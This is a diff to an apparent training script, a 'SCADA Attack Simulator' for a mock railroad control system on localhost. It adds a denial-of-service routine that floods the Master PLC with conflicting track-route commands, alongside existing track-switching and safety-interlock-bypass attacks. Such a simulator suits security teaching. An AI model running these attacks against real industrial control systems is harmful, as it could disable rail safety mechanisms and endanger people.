@@ -10,8 +10,8 @@ import json
 import urllib.request
 import urllib.error
 
-MASTER_URL = "http://localhost:8085" # Exposed Master PLC port
-SLAVE_1_URL = "http://localhost:8086" # Exposed Slave 1 port
+MASTER_URL = "http://localhost:8085" # exposed Master PLC port
+SLAVE_1_URL = "http://localhost:8086" # exposed Slave 1 port
 
 def send_post(url, data):
     req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
@@ -47,6 +47,21 @@ def attack_safety_bypass():
     print("    [!] The Master PLC now thinks the track is empty.")
     print("    [!] You can now switch tracks even if a train is physically there!")
 
+def attack_alarm_flood():
+    print("\n[*] ATTACK 3: SCADA Alarm Flooding (Denial of Service)")
+    print("    Target: Master PLC API (/api/command)")
+    print("    Action: Flooding system with conflicting route commands...")
+    
+    print("    [!] Sending 50 rapid requests...")
+    for i in range(50):
+        route = "ROUTE_A" if i % 2 == 0 else "ROUTE_B"
+        payload = {"segment_id": 3, "route": route}
+        send_post(f"{MASTER_URL}/api/command", payload)
+        time.sleep(0.1)
+    
+    print("    [!] Flood complete.")
+    print("    [!] Check the SCADA Dashboard. The Audit Log should be overwhelmed.")
+
 def main():
     print("╔════════════════════════════════════════════════╗")
     print("║     Railroad North - SCADA Attack Simulator    ║")
@@ -55,13 +70,16 @@ def main():
     print("\nSelect an attack vector:")
     print("1) Unauthorized Track Switching (Level 2 Attack)")
     print("2) Safety Interlock Bypass / Sensor Spoofing (Level 1 Attack)")
+    print("3) SCADA Alarm Flooding / DoS (Level 3 Attack)")
     
-    choice = input("\nEnter choice (1 or 2): ").strip()
+    choice = input("\nEnter choice (1, 2, or 3): ").strip()
     
     if choice == '1':
         attack_track_switch()
     elif choice == '2':
         attack_safety_bypass()
+    elif choice == '3':
+        attack_alarm_flood()
     else:
         print("Invalid choice.")
 
